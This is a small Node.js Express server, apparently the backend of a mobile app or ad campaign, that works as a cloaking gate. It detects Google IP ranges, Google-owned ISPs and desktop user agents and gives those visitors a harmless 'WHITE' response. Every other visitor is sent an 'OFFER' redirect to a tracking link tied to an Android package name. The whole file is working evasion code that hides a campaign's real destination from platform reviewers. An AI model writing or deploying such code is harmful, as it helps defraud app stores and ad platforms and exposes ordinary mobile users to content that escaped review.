const express = require('express')
const axios = require('axios')
const ipRangeCheck = require('ip-range-check')

const app = express()

app.use(express.json())

const GOOGLE_IP_RANGES = [
  "104.154.0.0/15",
  "34.0.0.0/8",
  "35.0.0.0/8",
  "66.249.64.0/19",
  "64.233.160.0/19",
  "8.8.8.0/24"
]

// 🔥 MAIN FLOW
app.post('/flow', async (req, res) => {

    // ✅ правильний IP
    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || ""
    const ip = rawIp.split(',')[0].trim()

    const { device, userAgent } = req.body

    let isp = ""

    // ✅ безпечний запит
    try {
        const ipData = await axios.get(`https://ipapi.co/${ip}/json/`, {
            timeout: 2000
        })
        isp = ipData.data.org || ""
    } catch (e) {
        console.log("IP API error:", e.message)
    }

    // =========================
    // 🔥 ФІЛЬТРИ
    // =========================

    // 1️⃣ IP RANGE (найшвидший)
    if (ipRangeCheck(ip, GOOGLE_IP_RANGES)) {
        console.log("BLOCK: Google IP", ip)
        return res.json({ action: "WHITE" })
    }

    // 2️⃣ ISP
    if (isp.includes("Google")) {
        console.log("BLOCK: ISP Google", isp)
        return res.json({ action: "WHITE" })
    }

    // 3️⃣ Desktop
    if (
        userAgent?.includes("Windows") ||
        userAgent?.includes("Mac") ||
        userAgent?.includes("X11")
    ) {
        console.log("BLOCK: Desktop", userAgent)
        return res.json({ action: "WHITE" })
    }

    // =========================
    // ✅ GOOD USER
    // =========================

    console.log("GOOD USER:", ip)

    return res.json({
        action: "OFFER",
        url: "https://trikstrip.fun/9YMjTwDG?sub_id_1=com.casual.memory.prismtwins"
    })
})

app.listen(3000, () => {
    console.log("🚀 Server started on port 3000")
})
